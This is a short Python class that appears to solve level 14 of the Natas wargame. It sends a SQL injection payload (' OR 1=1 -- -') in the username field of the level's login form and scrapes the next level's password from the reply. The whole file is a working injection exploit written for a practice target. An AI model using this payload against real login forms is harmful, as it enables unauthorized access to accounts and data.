import re
from src.natas.base_level import NatasLevel

class Level_14(NatasLevel):

  num = 14
  explanation = "On this level, the SQL query does not sanitize user input.\n     We inject '\" OR 1=1 -- -' into the username to make\n     the condition always true and retrieve all users."

  def exploit(self) -> str:

    payload = {
      'username': ' =" OR 1=1 -- -',
      'password': 'anything'
    }

    resp  = self.session.post(self.base_url, data = payload)
    match = re.search(r'The password for natas15 is (.*?)<br>', resp.text, re.MULTILINE).group(1).strip()

    return match
